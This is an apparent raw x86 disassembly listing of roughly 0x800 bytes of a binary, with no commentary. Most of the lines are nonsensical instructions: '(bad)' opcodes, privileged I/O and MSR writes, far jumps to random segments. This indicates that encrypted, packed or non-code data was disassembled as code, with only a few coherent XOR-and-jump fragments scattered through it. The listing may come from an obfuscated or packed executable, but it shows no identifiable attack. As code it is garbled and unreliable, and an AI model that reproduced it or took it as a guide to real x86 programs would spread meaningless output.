  407ce1:	sbb    eax,0xc68a2ca4
  407ce6:	aad    0x83
  407ce8:	sbb    dl,bl
  407cea:	out    0x61,eax
  407cec:	mov    esp,DWORD PTR [esi+0x51c0284f]
  407cf2:	cmc    
  407cf3:	iret   
  407cf4:	outs   dx,DWORD PTR ds:[esi]
  407cf5:	xor    DWORD PTR [eax+0x1669c6fe],esi
  407cfb:	fstp   QWORD PTR [edx-0x79f2cd74]
  407d01:	test   BYTE PTR [eax+0x18546f89],0x9b
  407d08:	jne    0x407d57
  407d0a:	cmp    al,0x55
  407d0c:	fdivr  QWORD PTR [ebx]
  407d0e:	mov    ebp,0x35a994c3
  407d13:	xchg   BYTE PTR [ecx-0x1c],dh
  407d16:	lods   al,BYTE PTR ds:[esi]
  407d17:	int3   
  407d18:	jmp    0x407d6e
  407d1a:	sahf   
  407d1b:	retf   0xbd6
  407d1e:	sub    BYTE PTR [edi-0x6ccd3509],0x34
  407d25:	hlt    
  407d26:	fisub  WORD PTR [ebx-0x42]
  407d29:	jp     0x407cd0
  407d2b:	das    
  407d2c:	mov    bh,0x4b
  407d2e:	jmp    0xfa96:0xc7abfc9a
  407d35:	clc    
  407d36:	cmp    ebx,DWORD PTR [ecx-0x25055460]
  407d3c:	ins    BYTE PTR es:[edi],dx
  407d3d:	(bad)  
  407d3e:	mov    bh,0xfe
  407d40:	add    BYTE PTR [edx-0x70e386c2],cl
  407d46:	add    al,0x9b
  407d48:	xor    cl,BYTE PTR [ebx+0x18d2bc84]
  407d4e:	ror    ebp,1
  407d50:	mov    ds:0x765d54a6,al
  407d55:	ds jnp 0x407ce0
  407d58:	inc    ecx
  407d59:	fdivrp st(7),st
  407d5b:	dec    eax
  407d5c:	outs   dx,DWORD PTR ds:[esi]
  407d5d:	rcr    DWORD PTR [ebp-0x62],1
  407d60:	inc    esi
  407d61:	cdq    
  407d62:	dec    edi
  407d63:	jge    0x407d10
  407d65:	xchg   DWORD PTR [edi+0x4f],eax
  407d68:	mov    ch,0xb8
  407d6a:	lahf   
  407d6b:	fneni(8087 only) 
  407d6d:	fwait
  407d6e:	push   ecx
  407d6f:	adc    DWORD PTR [ecx+eax*4-0x80],ebx
  407d73:	fcmovnb st,st(3)
  407d75:	dec    edi
  407d76:	add    eax,0x6081a14d
  407d7b:	add    edx,DWORD PTR [ecx]
  407d7d:	test   DWORD PTR [esp+eiz*2+0x52],esi
  407d81:	sbb    cl,BYTE PTR [eax-0x21]
  407d84:	pop    eax
  407d85:	adc    al,0x89
  407d87:	inc    esi
  407d88:	imul   ebp,DWORD PTR [ebp-0x6e],0xfffffffc
  407d8c:	inc    ebp
  407d8d:	add    al,0x53
  407d8f:	push   edi
  407d90:	or     eax,0xb3a0eb7a
  407d95:	test   eax,0xf389d190
  407d9a:	ins    DWORD PTR es:[edi],dx
  407d9b:	sub    eax,0x20aebac9
  407da0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407da1:	icebp  
  407da2:	sub    ebx,ebx
  407da4:	fbstp  TBYTE PTR ds:0xde4fa4b6
  407daa:	or     al,0x3b
  407dac:	inc    edi
  407dad:	or     ebp,edx
  407daf:	mov    bl,0xee
  407db1:	xor    eax,0x8ec131a4
  407db6:	into   
  407db7:	repnz push ds
  407db9:	(bad)  
  407dba:	cmp    edx,DWORD PTR [ebp+eiz*8-0x35832b1a]
  407dc1:	inc    esp
  407dc2:	(bad)  
  407dc3:	popa   
  407dc4:	dec    ecx
  407dc5:	mov    edi,DWORD PTR [edx-0x4a]
  407dc8:	das    
  407dc9:	mov    ebp,0x61e0a501
  407dce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dcf:	(bad)  
  407dd0:	sbb    edi,DWORD PTR [ebx-0x53]
  407dd3:	rcl    esp,cl
  407dd5:	(bad)  
  407dd6:	fmul   QWORD PTR [edi]
  407dd8:	jo     0x407d8c
  407dda:	ins    DWORD PTR es:[edi],dx
  407ddb:	sub    al,BYTE PTR [esi-0x1fbc299b]
  407de1:	test   BYTE PTR [ebp-0x42f3cbbe],ah
  407de7:	div    DWORD PTR [ebx]
  407de9:	xor    al,0x21
  407deb:	imul   ebp,DWORD PTR [ecx-0x3bce5673],0x35
  407df2:	inc    eax
  407df3:	fld    DWORD PTR ds:0x22d92cd4
  407df9:	shl    DWORD PTR [eax+0x6c17c021],cl
  407dff:	jb     0x407d9d
  407e01:	loop   0x407e6b
  407e03:	and    eax,edx
  407e05:	add    edx,ebx
  407e07:	push   es
  407e08:	enter  0x723c,0xe6
  407e0c:	jmp    0xfe143f92
  407e11:	inc    esi
  407e12:	leave  
  407e13:	add    ebx,0xfd5151ae
  407e19:	test   BYTE PTR [eax+eax*4],al
  407e1c:	xchg   esp,eax
  407e1d:	je     0x407e05
  407e1f:	test   BYTE PTR [ebx+0x3e2961a0],cl
  407e25:	je     0x407e92
  407e27:	push   edi
  407e28:	out    0xdb,al
  407e2a:	inc    ebp
  407e2b:	stc    
  407e2c:	push   eax
  407e2d:	xchg   BYTE PTR [ebp+0x740bad0d],bh
  407e33:	pop    esp
  407e34:	or     DWORD PTR [ecx],ebx
  407e36:	cli    
  407e37:	fidivr WORD PTR ds:0x5fc0e027
  407e3d:	xchg   ebp,ebx
  407e3f:	push   eax
  407e40:	adc    al,0x7a
  407e42:	test   DWORD PTR cs:[ebx+0x70],ebp
  407e46:	push   eax
  407e47:	or     ecx,DWORD PTR [esi]
  407e49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e4a:	cmp    BYTE PTR [eax],0xd9
  407e4d:	mov    esp,0x4fde6867
  407e52:	adc    edx,DWORD PTR [esi-0x7b7636b0]
  407e58:	sbb    eax,0x21753a8e
  407e5d:	shl    esp,cl
  407e5f:	mov    BYTE PTR [edi],bh
  407e61:	add    esp,0x610b53d2
  407e67:	mov    ch,0xd7
  407e69:	sbb    dl,BYTE PTR [edi-0x6c]
  407e6c:	lds    edi,FWORD PTR [ecx-0x33]
  407e6f:	fist   WORD PTR [ebp-0x46]
  407e72:	or     eax,ebx
  407e74:	ja     0x407e82
  407e7a:	mov    edx,DWORD PTR [ebp-0x2c]
  407e7d:	jmp    0x408770
  407e82:	mov    edx,DWORD PTR [ebp-0x34]
  407e85:	mov    edi,DWORD PTR [ebp-0x4]
  407e88:	xor    edx,eax
  407e8a:	xor    edi,eax
  407e8c:	jmp    0x40803d
  407e91:	(bad)  
  407e92:	in     al,dx
  407e93:	test   eax,0x4771b1f1
  407e98:	call   0x1b74fcaf
  407e9d:	and    eax,0x116df6f6
  407ea2:	int    0x7e
  407ea4:	jle    0x407e30
  407ea6:	jg     0x407f26
  407ea8:	jle    0x407e8c
  407eaa:	jo     0x407e73
  407eac:	(bad)  
  407ead:	in     al,dx
  407eae:	mov    ebp,ss
  407eb0:	into   
  407eb1:	adc    DWORD PTR [edx+ecx*2-0x2b],ebp
  407eb5:	cli    
  407eb6:	add    eax,0xeea44343
  407ebb:	js     0x407e6b
  407ebd:	in     eax,0xae
  407ebf:	lods   eax,DWORD PTR ds:[esi]
  407ec0:	mov    bh,0x4b
  407ec2:	adc    esi,ecx
  407ec4:	push   es
  407ec5:	xchg   esi,eax
  407ec6:	lods   al,BYTE PTR ds:[esi]
  407ec7:	jge    0x407e4d
  407ec9:	lods   al,BYTE PTR ds:[esi]
  407eca:	mov    ds:0xf12abd40,al
  407ecf:	mov    BYTE PTR [ecx-0x11926917],al
  407ed5:	into   
  407ed6:	loop   0x407f0f
  407ed8:	sbb    eax,0xa193bf39
  407edd:	cmp    esi,DWORD PTR [ebp+0x4c3d1d43]
  407ee3:	repnz into 
  407ee5:	dec    esi
  407ee6:	wrmsr  
  407ee8:	fimul  DWORD PTR [ebx+0x788cee63]
  407eee:	jmp    0x407f31
  407ef0:	shl    DWORD PTR [eax-0x10],1
  407ef3:	in     eax,dx
  407ef4:	ins    BYTE PTR es:[edi],dx
  407ef5:	repz jp 0x407f23
  407ef8:	les    ebp,FWORD PTR [esi-0x77bd2f69]
  407efe:	fsubr  DWORD PTR [ebp+ecx*2+0x31]
  407f02:	jle    0x407edc
  407f04:	sbb    al,0x48
  407f06:	sbb    dh,BYTE PTR [edi+0x79a18520]
  407f0c:	fisubr WORD PTR [edx+0x6f]
  407f0f:	push   esp
  407f10:	jmp    0xeee0:0x4d7a50b4
  407f17:	shr    BYTE PTR [edx+ebx*1-0x56],cl
  407f1b:	pop    ds
  407f1c:	(bad)  
  407f1e:	add    ecx,esp
  407f20:	and    eax,edx
  407f22:	cmp    al,0xdc
  407f24:	and    esi,DWORD PTR [esi-0x48]
  407f27:	and    ecx,DWORD PTR [edx-0x37]
  407f2a:	mov    eax,0xb16eebb
  407f2f:	push   0x2f
  407f31:	push   ecx
  407f32:	pop    edi
  407f33:	adc    eax,0xb7a8ad6f
  407f38:	jb     0x407ec7
  407f3a:	stc    
  407f3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f3c:	jl     0x407ed5
  407f3e:	(bad)  
  407f3f:	not    BYTE PTR [ebx*1-0x66905e13]
  407f46:	cmp    ah,al
  407f48:	shr    BYTE PTR [edi],0x9
  407f4b:	xchg   ebx,eax
  407f4c:	pop    esp
  407f4d:	enter  0x90d2,0xe1
  407f51:	sbb    cl,dh
  407f53:	js     0x407f79
  407f55:	and    edi,0x9215b1db
  407f5b:	retf   0x5d4e
  407f5e:	sti    
  407f5f:	or     al,0xd5
  407f61:	or     dl,0x64
  407f64:	pop    eax
  407f65:	test   DWORD PTR [ecx],ecx
  407f67:	mov    ebp,0x1e464b5a
  407f6c:	push   0x37
  407f6e:	inc    ebx
  407f6f:	mov    WORD PTR [ecx],?
  407f71:	xlat   BYTE PTR ds:[ebx]
  407f72:	pushf  
  407f73:	addr16 retf 0xe7ea
  407f77:	int3   
  407f78:	push   esp
  407f79:	mov    eax,ds:0x934ecf45
  407f7e:	(bad)  
  407f7f:	sti    
  407f80:	jne    0x407f2a
  407f82:	xor    al,BYTE PTR [esi]
  407f84:	dec    esi
  407f85:	inc    ebp
  407f86:	mov    al,0x13
  407f88:	ins    BYTE PTR es:[edi],dx
  407f89:	lds    esi,FWORD PTR [ebx+ecx*1]
  407f8c:	sbb    BYTE PTR [ebp-0x79779e70],0xfb
  407f93:	retf   
  407f94:	xchg   ebp,eax
  407f95:	dec    esp
  407f96:	mov    cl,0xe1
  407f98:	adc    BYTE PTR [ebp+eiz*8+0x38a1916e],ah
  407f9f:	pushf  
  407fa0:	fwait
  407fa1:	sti    
  407fa2:	ins    BYTE PTR es:[edi],dx
  407fa3:	mov    edi,0xde997ee2
  407fa8:	inc    ebp
  407fa9:	sub    al,BYTE PTR [eax+ebx*2+0x56]
  407fad:	mul    BYTE PTR [esi-0x18]
  407fb0:	in     eax,dx
  407fb1:	mov    eax,ds:0xc674af39
  407fb6:	jno    0x407fce
  407fb8:	sub    eax,0x707139b1
  407fbd:	add    al,0x98
  407fbf:	jl     0x407fe2
  407fc1:	push   edi
  407fc2:	jae    0x407ff4
  407fc4:	mov    esp,0x53703075
  407fc9:	out    dx,eax
  407fca:	sbb    BYTE PTR [ebx],bl
  407fcc:	cmp    al,al
  407fce:	sub    bh,BYTE PTR [ebx+ebp*8]
  407fd1:	and    al,0xc7
  407fd3:	inc    ebp
  407fd4:	ror    DWORD PTR [ebp-0x61],1
  407fd7:	shr    BYTE PTR [edi],0xc7
  407fda:	dec    esi
  407fdb:	sbb    eax,0x1a6748c3
  407fe0:	mov    al,0x82
  407fe2:	bound  esp,QWORD PTR [esi-0x3e500153]
  407fe8:	sar    BYTE PTR [edi-0x30],1
  407feb:	mov    dl,0x1f
  407fed:	xchg   DWORD PTR [ebp+0x4d],edx
  407ff0:	inc    edi
  407ff1:	xchg   ecx,eax
  407ff2:	stos   DWORD PTR es:[edi],eax
  407ff3:	sub    eax,0x5dcb65c2
  407ff8:	cmp    DWORD PTR [ebp+0x17],esi
  407ffb:	ss repnz mov ss,ebp
  407fff:	sbb    eax,0xb808161c
  408004:	ins    BYTE PTR es:[edi],dx
  408005:	jmp    0x3268:0xf827e8ae
  40800c:	or     DWORD PTR [ecx+0x75],ebx
  40800f:	push   edx
  408010:	imul   edi,edi,0xf4efbc8e
  408016:	retf   0x1a01
  408019:	call   0x2848:0x4c9e93c6
  408020:	xchg   edx,eax
  408021:	inc    edx
  408022:	cmp    ah,dh
  408024:	cmp    DWORD PTR [edi],edi
  408026:	mov    ecx,0xa051ada1
  40802b:	xchg   edi,eax
  40802c:	cmc    
  40802d:	in     eax,dx
  40802e:	pusha  
  40802f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408030:	(bad)  
  408032:	dec    eax
  408033:	cmp    ah,ah
  408035:	lock rcr bh,cl
  408038:	ja     0x408040
  40803a:	cmp    DWORD PTR [eax+0x3f903d4],0xffffffd1
  408041:	imul   edx,edi
  408044:	mov    edi,DWORD PTR [ebp-0x8]
  408047:	mov    ebx,DWORD PTR [ebp-0x10]
  40804a:	sub    ebx,edi
  40804c:	cmp    ebx,edx
  40804e:	ja     0x40805c
  408054:	mov    edx,DWORD PTR [ebp-0x30]
  408057:	jmp    0x408770
  40805c:	mov    edx,DWORD PTR [ebp-0x38]
  40805f:	mov    edi,DWORD PTR [ebp-0x4]
  408062:	xor    edx,eax
  408064:	xor    edi,eax
  408066:	add    edi,ecx
  408068:	jmp    0x408219
  40806d:	jmp    0x958e95d5
  408072:	push   0x185c6171
  408077:	mov    ch,0xe0
  408079:	jmp    0xadeeb51b
  40807e:	retf   0x7e7e
  408081:	mov    bh,BYTE PTR [edi+0x7e]
  408084:	jle    0x4080f5
  408086:	jbe    0x408062
  408088:	int    0xc2
  40808a:	fucomp st(4)
  40808c:	or     eax,0x3f298579
  408091:	inc    edi
  408092:	cdq    
  408093:	jns    0x408034
  408095:	add    BYTE PTR [edi+0x5b],ch
  408098:	fsubr  QWORD PTR [ebx]
  40809a:	pusha  
  40809b:	les    edi,FWORD PTR [edx]
  40809d:	mov    al,ds:0xc0884020
  4080a2:	cmovb  ecx,DWORD PTR [ecx]
  4080a5:	sbb    BYTE PTR [eax],dl
  4080a7:	scas   eax,DWORD PTR es:[edi]
  4080a8:	nop
  4080a9:	in     al,dx
  4080aa:	retf   0x2fbe
  4080ad:	xlat   BYTE PTR ds:[ebx]
  4080ae:	and    ebp,edi
  4080b0:	stos   BYTE PTR es:[edi],al
  4080b1:	jno    0x4080ed
  4080b3:	and    cl,al
  4080b5:	int    0x9f
  4080b7:	adc    al,0x2b
  4080b9:	push   esp
  4080ba:	xor    BYTE PTR [edi-0x2f45d9cd],al
  4080c0:	test   al,0xda
  4080c2:	mov    bl,0xdb
  4080c4:	pop    esp
  4080c5:	int    0x8
  4080c7:	icebp  
  4080c8:	sbb    al,BYTE PTR [ebx+0x30]
  4080cb:	dec    esi
  4080cc:	or     eax,0x9050d05b
  4080d1:	fiadd  DWORD PTR cs:[ecx]
  4080d4:	xchg   ecx,eax
  4080d5:	push   edi
  4080d6:	mov    DWORD PTR [edx+eax*8+0x248be819],edi
  4080dd:	mov    dh,0x32
  4080df:	(bad)  
  4080e1:	jle    0x40809b
  4080e3:	xchg   edi,ebp
  4080e5:	mov    ds:0xd6802ebe,eax
  4080ea:	cli    
  4080eb:	daa    
  4080ec:	loope  0x408145
  4080ee:	in     al,dx
  4080ef:	push   ss
  4080f0:	mov    bl,0x5a
  4080f2:	retf   0x202e
  4080f5:	jecxz  0x4080ee
  4080f7:	popf   
  4080f8:	adc    ebp,DWORD PTR [ecx+0x1a]
  4080fb:	(bad)  
  4080fd:	xchg   edx,eax
  4080fe:	xchg   DWORD PTR [ebx],ebx
  408100:	js     0x408145
  408102:	call   0xe0ae:0x7d92a626
  408109:	outs   dx,DWORD PTR ds:[esi]
  40810a:	jecxz  0x408181
  40810c:	add    eax,0xc57d4030
  408111:	imul   ebp,DWORD PTR [edx+0x55],0xffffffa9
  408115:	inc    ebp
  408116:	stos   DWORD PTR es:[edi],eax
  408117:	jb     0x4080a9
  408119:	push   edi
  40811a:	adc    eax,0x6b062e3e
  40811f:	pop    edx
  408120:	mov    esi,0x68917a3b
  408125:	rcr    DWORD PTR [eax+0x1f],1
  408128:	aaa    
  408129:	les    ebx,FWORD PTR [esi+0x221f5a26]
  40812f:	popa   
  408130:	sbb    DWORD PTR [esp+esi*8+0x67],0x5f
  408135:	mov    cs,WORD PTR [ecx-0x14668f82]
  40813b:	or     BYTE PTR [edi-0x33],0x16
  40813f:	mov    esi,0xce5fec0d
  408144:	or     cl,BYTE PTR [esi]
  408146:	hlt    
  408147:	jae    0x40816e
  408149:	out    0x61,al
  40814b:	cmp    dh,BYTE PTR [ebp-0x3c]
  40814e:	dec    ebp
  40814f:	mov    edx,0xe45c6d12
  408154:	sub    eax,0x286af771
  408159:	inc    ebx
  40815a:	lea    esp,[eax-0x57]
  40815d:	mov    ecx,DWORD PTR [ebx+0xb7fb047]
  408163:	mov    dl,0x76
  408165:	je     0x40817b
  408167:	js     0x4081ba
  408169:	cmp    BYTE PTR [ecx-0x202b0e77],cl
  40816f:	in     al,0xda
  408171:	or     eax,DWORD PTR [esi+esi*2-0x7409db0b]
  408178:	xor    al,dl
  40817a:	fnstcw WORD PTR [edx-0x44]
  40817d:	(bad)  
  40817e:	lahf   
  40817f:	fmul   QWORD PTR [eax]
  408181:	or     ecx,DWORD PTR [esi]
  408183:	ins    BYTE PTR es:[edi],dx
  408184:	push   0x78
  408186:	pop    esp
  408187:	mov    ebx,0xd2773487
  40818c:	and    ebp,ecx
  40818e:	cmp    BYTE PTR [eax],al
  408190:	ret    
  408191:	retf   
  408192:	rcl    BYTE PTR [ecx-0x37],0x79
  408196:	sbb    eax,0x865409c0
  40819b:	inc    esp
  40819c:	mov    al,ds:0x4489ce39
  4081a1:	cmp    BYTE PTR [edi],0xc1
  4081a4:	xchg   esp,eax
  4081a5:	mov    fs,WORD PTR [esi-0x224c0e48]
  4081ab:	sar    DWORD PTR [edx],0x4c
  4081ae:	push   ds
  4081af:	push   es
  4081b0:	pop    ecx
  4081b1:	jne    0x408174
  4081b3:	add    ch,BYTE PTR [ecx+0x1c7f94ff]
  4081b9:	cmp    al,BYTE PTR [edi+0x57]
  4081bc:	gs and al,0x49
  4081bf:	push   cs
  4081c0:	lock arpl WORD PTR [ebx-0x6b7a3f97],si
  4081c7:	mov    dl,BYTE PTR [ecx]
  4081c9:	dec    eax
  4081ca:	mov    bl,0x1b
  4081cc:	and    al,0x71
  4081ce:	mov    edx,0x9a9841c4
  4081d3:	fist   WORD PTR [ecx+eax*4+0x4324c9dd]
  4081da:	xlat   BYTE PTR ds:[ebx]
  4081db:	iret   
  4081dc:	inc    ebx
  4081dd:	(bad)  
  4081de:	aam    0x8e
  4081e0:	sbb    ecx,edx
  4081e2:	xor    ch,bh
  4081e4:	dec    edi
  4081e5:	mov    ebp,ebx
  4081e7:	test   eax,0x7c93ce25
  4081ec:	ins    DWORD PTR es:[edi],dx
  4081ed:	into   
  4081ee:	mov    ch,0xbb
  4081f0:	sub    ch,BYTE PTR [eax-0x5230f3a]
  4081f6:	inc    esi
  4081f7:	mov    bh,0xcc
  4081f9:	shl    BYTE PTR ds:0x36fea550,0x76
  408200:	add    DWORD PTR [eax-0x6d39391],0x95f31da
  40820a:	jo     0x4081f0
  40820c:	cs mov ah,ch
  40820f:	xor    DWORD PTR [edi-0x17],ecx
  408212:	cmp    dl,BYTE PTR [edi+0x34]
  408215:	mov    dl,0x48
  408217:	mov    edx,0xe9d103f6
  40821c:	lods   al,BYTE PTR ds:[esi]
  40821d:	add    DWORD PTR [eax],eax
  40821f:	add    BYTE PTR [eax+edx*1+0x3f],cl
  408223:	add    eax,DWORD PTR [ebx-0x2f]
  408226:	push   eax
  408227:	push   ecx
  408228:	jl     0x4082a4
  40822a:	jmp    0x396d:0x96a38662
  408231:	enter  0x7e7e,0x8a
  408235:	jg     0x4082b5
  408237:	jle    0x408209
  408239:	call   FWORD PTR [edi]
  40823b:	jmp    0x5f5d:0x5fbab1f6
  408242:	mov    ebp,0x41eaef83
  408247:	jno    0x4081f9
  408249:	rcr    DWORD PTR ds:0x28c6ccb8,1
  40824f:	jae    0x4081d7
  408251:	lods   al,BYTE PTR ds:[esi]
  408252:	lock adc ebx,DWORD PTR [edi+0x29374a36]
  408259:	mov    esi,0x3e7dacb2
  40825e:	dec    ebp
  40825f:	fidivr WORD PTR [esi+ebp*2]
  408262:	ins    DWORD PTR es:[edi],dx
  408263:	jmp    0xa7da4436
  408268:	pushf  
  408269:	repz dec edi
  40826b:	pop    eax
  40826c:	xor    bl,BYTE PTR [edx-0x50cbc571]
  408272:	mov    eax,DWORD PTR [edx]
  408274:	dec    eax
  408275:	xor    eax,DWORD PTR [edi-0x1e]
  408278:	fldl2t 
  40827a:	(bad)  
  40827b:	cmp    dh,BYTE PTR [ebp-0x18]
  40827e:	(bad)  
  40827f:	jns    0x40821d
  408281:	or     BYTE PTR [ebx-0x4a],0x14
  408285:	fiadd  DWORD PTR [esp+eiz*4]
  408288:	aam    0x87
  40828a:	pop    edi
  40828b:	retf   
  40828c:	cmp    al,0xd7
  40828e:	dec    edx
  40828f:	stos   BYTE PTR es:[edi],al
  408290:	jns    0x408223
  408292:	mov    ss,WORD PTR [esi-0x34]
  408295:	out    dx,eax
  408296:	retf   0x383d
  408299:	mov    ah,0x97
  40829b:	jp     0x4082a6
  40829d:	sti    
  40829e:	shl    ebx,1
  4082a0:	jne    0x408249
  4082a2:	add    eax,0x7c64dd30
  4082a7:	mov    eax,ds:0x8c7909a5
  4082ac:	pop    ebx
  4082ad:	pop    esp
  4082ae:	inc    ebp
  4082af:	cmp    BYTE PTR [ebp+0x56],0xf7
  4082b3:	jmp    0xb718af5a
  4082b8:	test   al,0x1a
  4082ba:	ja     0x40825d
  4082bc:	mov    DWORD PTR [ecx],ecx
  4082be:	ret    0x255c
  4082c1:	cmp    BYTE PTR [edi],dh
  4082c3:	xchg   edx,eax
  4082c4:	jg     0x408280
  4082c6:	lea    edi,[ebx-0x67b71577]
  4082cc:	add    BYTE PTR [esi+0x3329dd01],0x1b
  4082d3:	push   es
  4082d4:	int    0x60
  4082d6:	into   
  4082d7:	sub    DWORD PTR [ebx-0x80],esi
  4082da:	xchg   ah,dl
  4082dc:	jne    0x408347
  4082de:	pop    esi
  4082df:	push   ss
  4082e0:	cmp    edi,DWORD PTR [ebx-0x18c5ffcb]
  4082e6:	sahf   
  4082e7:	mov    al,BYTE PTR [edi+0x782dbef4]
  4082ed:	push   esp
  4082ee:	push   ecx
  4082ef:	(bad)  
  4082f0:	pop    ebx
  4082f1:	ret    0x608d
  4082f4:	imul   ebp,ebp,0x38
  4082f7:	test   dh,al
  4082f9:	sub    BYTE PTR [edi],cl
  4082fb:	into   
  4082fc:	imul   ebx,edi,0xfd31012e
  408302:	or     BYTE PTR [eax],bh
  408304:	xor    eax,0xffc56400
  408309:	push   ebp
  40830a:	mov    eax,0x5a5be030
  40830f:	(bad)  
  408310:	xor    eax,0xeee0ca07
  408315:	test   edi,esp
  408317:	pop    edx
  408318:	xchg   esi,eax
  408319:	xor    al,0xa2
  40831b:	pop    eax
  40831c:	(bad)  
  40831d:	jae    0x40831b
  40831f:	xchg   edi,eax
  408320:	add    BYTE PTR [eax+0x8],0xea
  408324:	iret   
  408325:	adc    BYTE PTR [edx+0x1eb234e],bl
  40832b:	pop    esp
  40832c:	mov    dh,0xc5
  40832e:	pop    edx
  40832f:	mov    esi,DWORD PTR [edi+0x6b]
  408332:	jp     0x4082f2
  408334:	inc    ebx
  408335:	rcr    BYTE PTR [edi],1
  408337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408338:	cmp    BYTE PTR [esi-0x6c585400],ah
  40833e:	push   cs
  40833f:	push   esi
  408340:	sti    
  408341:	add    ah,dh
  408343:	mov    al,0x50
  408345:	push   esi
  408346:	clc    
  408347:	fwait
  408348:	sbb    al,0xe1
  40834a:	fisttp QWORD PTR [esi+edi*4-0x581079b9]
  408351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408352:	jno    0x408371
  408354:	mov    ds:0x31485dba,eax
  408359:	outs   dx,DWORD PTR ds:[esi]
  40835a:	mov    BYTE PTR [eax-0x5f],ch
  40835d:	jno    0x4083cf
  40835f:	ins    DWORD PTR es:[edi],dx
  408360:	stos   BYTE PTR es:[edi],al
  408361:	loope  0x40836d
  408363:	jnp    0x4083de
  408365:	sub    BYTE PTR [ecx],cl
  408367:	sti    
  408368:	adc    DWORD PTR [ecx-0x2300fc1c],esp
  40836e:	std    
  40836f:	test   eax,0x52168f49
  408374:	loopne 0x40833a
  408376:	iret   
  408377:	push   es
  408378:	xor    ebx,ebx
  40837a:	add    ah,BYTE PTR [ecx-0x73eed7d9]
  408380:	repnz rep ins DWORD PTR es:[edi],dx
  408383:	push   esi
  408384:	(bad)  
  408385:	loopne 0x4083a2
  408387:	out    dx,eax
  408388:	add    dh,bl
  40838a:	pop    ebp
  40838b:	fnstenv [edx+eiz*4]
  40838e:	sti    
  40838f:	pop    ebx
  408390:	mov    ebp,0xb80ca5bb
  408395:	adc    al,0x99
  408397:	bsf    esp,DWORD PTR [eax-0x70]
  40839b:	dec    ebx
  40839c:	cmp    DWORD PTR [ecx],esi
  40839e:	cmc    
  40839f:	daa    
  4083a0:	xchg   esp,eax
  4083a1:	call   0x9144:0xafd4a008
  4083a8:	add    DWORD PTR [edx],esi
  4083aa:	cmp    ch,BYTE PTR [esi+0x876cbd8]
  4083b0:	inc    ebp
  4083b1:	xor    eax,edi
  4083b3:	xor    ebp,edx
  4083b5:	lock and esi,DWORD PTR [eax-0x1eaa2a57]
  4083bc:	lds    esi,FWORD PTR [ebx-0x676823b7]
  4083c2:	icebp  
  4083c3:	pop    edx
  4083c4:	aad    0xba
  4083c6:	cmp    ebx,DWORD PTR [ebx+0x2b]
  4083c9:	mov    ds:0xaf0fcd84,al
  4083ce:	xlat   BYTE PTR ds:[ebx]
  4083cf:	mov    edi,DWORD PTR [ebp-0x8]
  4083d2:	mov    ebx,DWORD PTR [ebp-0x10]
  4083d5:	sub    ebx,edi
  4083d7:	jmp    0x408588
  4083dc:	and    BYTE PTR [ebx-0x6c4aede2],ch
  4083e2:	xor    BYTE PTR [ecx-0x29441d92],ch
  4083e8:	sub    BYTE PTR [edi],bh
  4083ea:	sub    al,bl
  4083ec:	push   ebp
  4083ed:	leave  
  4083ee:	jle    0x40846e
  4083f0:	mov    bh,BYTE PTR [edi+0x7e]
  4083f3:	jle    0x4083b7
  4083f5:	dec    ecx
  4083f6:	int3   
  4083f7:	ins    DWORD PTR es:[edi],dx
  4083f8:	repz hlt 
  4083fa:	mov    BYTE PTR [ebx+edi*2],bl
  4083fd:	jns    0x40837f
  4083ff:	sbb    bh,cl
  408401:	test   al,0xc6
  408403:	enter  0x5559,0xf9
  408407:	cmp    ebp,DWORD PTR [edi-0x22]
  40840a:	mov    ah,0x8c
  40840c:	fmul   DWORD PTR [ecx+0x7b]
  40840f:	sbb    esp,DWORD PTR ds:0x98fc0929
  408415:	push   ebp
  408416:	adc    DWORD PTR [ebp-0x5fdbc35c],0xf07e1e15
  408420:	lds    eax,FWORD PTR [ecx-0x44560a39]
  408426:	jbe    0x408428
  408428:	lahf   
  408429:	push   esi
  40842a:	cmp    al,0x4b
  40842c:	push   ebx
  40842d:	push   ds
  40842e:	dec    ebx
  40842f:	mov    ?,WORD PTR [eax-0x41295657]
  408435:	stos   DWORD PTR es:[edi],eax
  408436:	inc    eax
  408437:	(bad)
  40843b:	in     al,dx
  40843c:	push   cs
  40843d:	jge    0x4083fd
  40843f:	or     esi,edi
  408441:	xor    al,0x4f
  408443:	mov    ecx,0x1f32ec92
  408448:	xor    al,0x33
  40844a:	mov    ecx,0x4b7d8199
  40844f:	mov    edi,0xb29511e9
  408454:	sar    DWORD PTR [ebx-0x20],cl
  408457:	push   ecx
  408458:	push   ecx
  408459:	sbb    edi,DWORD PTR [edi+0x47405bf0]
  40845f:	dec    eax
  408460:	bswap  esp
  408462:	sti    
  408463:	loope  0x4084cf
  408465:	fstp   TBYTE PTR [edi-0x67]
  408468:	fidivr DWORD PTR [esi-0x78]
  40846b:	scas   al,BYTE PTR es:[edi]
  40846c:	(bad)  
  40846d:	imul   edi,DWORD PTR [eax+ecx*2-0x4c],0x9cebdb75
  408475:	test   BYTE PTR [ecx-0x1],dl
  408478:	sub    al,0xe5
  40847a:	dec    ebp
  40847b:	shl    DWORD PTR [eax+0x5a],1
  40847e:	fstp   TBYTE PTR [edi]
  408480:	or     al,0xb3
  408482:	jnp    0x4084bf
  408484:	cmp    dl,cl
  408486:	push   esp
  408487:	pop    esi
  408488:	push   edx
  408489:	sbb    dl,BYTE PTR [edx]
  40848b:	mov    bh,0x4
  40848d:	stos   BYTE PTR es:[edi],al
  40848e:	stos   DWORD PTR es:[edi],eax
  40848f:	sahf   
  408490:	ss test al,0xfa
  408493:	imul   eax,DWORD PTR [eax-0x72],0x3d7d7ac8
  40849a:	(bad)  
  40849b:	sahf   
  40849c:	dec    ebx
  40849d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40849e:	hlt    
  40849f:	mov    ch,0xb8
  4084a1:	add    bl,ah
  4084a3:	ss sbb eax,0x505e9caf
  4084a9:	dec    esi
  4084aa:	mov    DWORD PTR [edx+0x44bc2fb2],edi
  4084b0:	jmp    0x9405:0x734f8eec
  4084b7:	add    al,0x86
  4084b9:	or     ch,BYTE PTR [ebx-0x3c]
  4084bc:	jno    0x408532
  4084be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084bf:	mov    bh,0x26
  4084c1:	ins    BYTE PTR es:[edi],dx
